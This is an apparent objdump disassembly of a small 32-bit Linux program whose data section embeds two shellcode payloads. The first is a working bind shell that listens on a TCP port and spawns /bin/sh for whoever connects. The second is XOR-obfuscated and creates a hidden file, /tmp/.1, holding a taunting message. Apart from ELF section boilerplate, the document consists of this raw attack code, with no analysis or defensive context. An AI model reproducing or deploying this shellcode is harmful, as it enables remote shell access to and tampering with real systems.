 8049fac:	13 00                	adc    eax,DWORD PTR [eax]
 8049fae:	00 00                	add    BYTE PTR [eax],al
 8049fb0:	08 00                	or     BYTE PTR [eax],al
 8049fb2:	00 00                	add    BYTE PTR [eax],al
 8049fb4:	fe                   	(bad)  
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f 8c             	jmp    FWORD PTR [edi-0x74]
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    al,0x8
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	jmp    FWORD PTR [edi+0x1]
 8049fc1:	00 00                	add    BYTE PTR [eax],al
 8049fc3:	00 f0                	add    al,dh
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f 80             	jmp    FWORD PTR [edi-0x80]
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    al,0x8
	...

Disassembly of section .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    BYTE PTR [eax],al
	...

Disassembly of section .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    al,0x9f
 804a002:	04 08                	add    al,0x8
	...
 804a00c:	06                   	push   es
 804a00d:	83 04 08 16          	add    DWORD PTR [eax+ecx*1],0x16
 804a011:	83 04 08 26          	add    DWORD PTR [eax+ecx*1],0x26
 804a015:	83                   	.byte 0x83
 804a016:	04 08                	add    al,0x8

Disassembly of section .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    BYTE PTR [eax],al
	...

0804a024 <__dso_handle>:
	...

0804a040 <code>:
 804a040:	31 db                	xor    ebx,ebx
 804a042:	f7 e3                	mul    ebx
 804a044:	b0 66                	mov    al,0x66
 804a046:	43                   	inc    ebx
 804a047:	52                   	push   edx
 804a048:	53                   	push   ebx
 804a049:	6a 02                	push   0x2
 804a04b:	89 e1                	mov    ecx,esp
 804a04d:	cd 80                	int    0x80
 804a04f:	5b                   	pop    ebx
 804a050:	5e                   	pop    esi
 804a051:	52                   	push   edx
 804a052:	66 68 2b 67          	pushw  0x672b
 804a056:	6a 10                	push   0x10
 804a058:	51                   	push   ecx
 804a059:	50                   	push   eax
 804a05a:	b0 66                	mov    al,0x66
 804a05c:	89 e1                	mov    ecx,esp
 804a05e:	cd 80                	int    0x80
 804a060:	89 51 04             	mov    DWORD PTR [ecx+0x4],edx
 804a063:	b0 66                	mov    al,0x66
 804a065:	b3 04                	mov    bl,0x4
 804a067:	cd 80                	int    0x80
 804a069:	b0 66                	mov    al,0x66
 804a06b:	43                   	inc    ebx
 804a06c:	cd 80                	int    0x80
 804a06e:	59                   	pop    ecx
 804a06f:	93                   	xchg   ebx,eax
 804a070:	6a 3f                	push   0x3f
 804a072:	58                   	pop    eax
 804a073:	cd 80                	int    0x80
 804a075:	49                   	dec    ecx
 804a076:	79 f8                	jns    804a070 <code+0x30>
 804a078:	b0 0b                	mov    al,0xb
 804a07a:	68 2f 2f 73 68       	push   0x68732f2f
 804a07f:	68 2f 62 69 6e       	push   0x6e69622f
 804a084:	89 e3                	mov    ebx,esp
 804a086:	41                   	inc    ecx
 804a087:	cd 80                	int    0x80
	...

0804a0a0 <shellcode>:
 804a0a0:	31 c9                	xor    ecx,ecx
 804a0a2:	b9 0e 0f 10 21       	mov    ecx,0x21100f0e
 804a0a7:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a0ad:	51                   	push   ecx
 804a0ae:	31 c9                	xor    ecx,ecx
 804a0b0:	b9 0e 55 4c 51       	mov    ecx,0x514c550e
 804a0b5:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a0bb:	51                   	push   ecx
 804a0bc:	89 e3                	mov    ebx,esp
 804a0be:	31 c0                	xor    eax,eax
 804a0c0:	31 c9                	xor    ecx,ecx
 804a0c2:	31 d2                	xor    edx,edx
 804a0c4:	b0 05                	mov    al,0x5
 804a0c6:	b1 41                	mov    cl,0x41
 804a0c8:	b6 01                	mov    dh,0x1
 804a0ca:	b2 c0                	mov    dl,0xc0
 804a0cc:	cd 80                	int    0x80
 804a0ce:	89 c3                	mov    ebx,eax
 804a0d0:	31 c9                	xor    ecx,ecx
 804a0d2:	b9 44 0f 01 2b       	mov    ecx,0x2b010f44
 804a0d7:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a0dd:	51                   	push   ecx
 804a0de:	31 c9                	xor    ecx,ecx
 804a0e0:	b9 4c 52 49 4e       	mov    ecx,0x4e49524c
 804a0e5:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a0eb:	51                   	push   ecx
 804a0ec:	31 c9                	xor    ecx,ecx
 804a0ee:	b9 0d 01 46 54       	mov    ecx,0x5446010d
 804a0f3:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a0f9:	51                   	push   ecx
 804a0fa:	31 c9                	xor    ecx,ecx
 804a0fc:	b9 01 4b 4e 43       	mov    ecx,0x434e4b01
 804a101:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a107:	51                   	push   ecx
 804a108:	31 c9                	xor    ecx,ecx
 804a10a:	b9 4f 48 42 44       	mov    ecx,0x4442484f
 804a10f:	81 f1 21 21 21 21    	xor    ecx,0x21212121
 804a115:	51                   	push   ecx
 804a116:	89 e1                	mov    ecx,esp
 804a118:	31 c0                	xor    eax,eax
 804a11a:	b0 04                	mov    al,0x4
 804a11c:	31 d2                	xor    edx,edx
 804a11e:	b2 14                	mov    dl,0x14
 804a120:	cd 80                	int    0x80
 804a122:	31 c0                	xor    eax,eax
 804a124:	b0 06                	mov    al,0x6
 804a126:	31 db                	xor    ebx,ebx
 804a128:	31 c0                	xor    eax,eax
 804a12a:	b0 01                	mov    al,0x1
 804a12c:	cd 80                	int    0x80
	...

Disassembly of section .bss:

0804a12f <__bss_start>:
	...

Disassembly of section .comment:

00000000 <.comment>:
   0:	47                   	inc    edi
   1:	43                   	inc    ebx
   2:	43                   	inc    ebx
   3:	3a 20                	cmp    ah,BYTE PTR [eax]
   5:	28 55 62             	sub    BYTE PTR [ebp+0x62],dl
   8:	75 6e                	jne    78 <_init-0x8048254>
   a:	74 75                	je     81 <_init-0x804824b>
   c:	20 35 2e 34 2e 30    	and    BYTE PTR ds:0x302e342e,dh
  12:	2d 36 75 62 75       	sub    eax,0x75627536
  17:	6e                   	outs   dx,BYTE PTR ds:[esi]
  18:	74 75                	je     8f <_init-0x804823d>
  1a:	31 7e 31             	xor    DWORD PTR [esi+0x31],edi
  1d:	36 2e 30 34 2e       	ss xor BYTE PTR cs:[esi+ebp*1],dh
  22:	36 29 20             	sub    DWORD PTR ss:[eax],esp
  25:	35 2e 34 2e 30       	xor    eax,0x302e342e
  2a:	20 32                	and    BYTE PTR [edx],dh
  2c:	30 31                	xor    BYTE PTR [ecx],dh
  2e:	36 30 36             	xor    BYTE PTR ss:[esi],dh
  31:	30 39                	xor    BYTE PTR [ecx],bh
	...
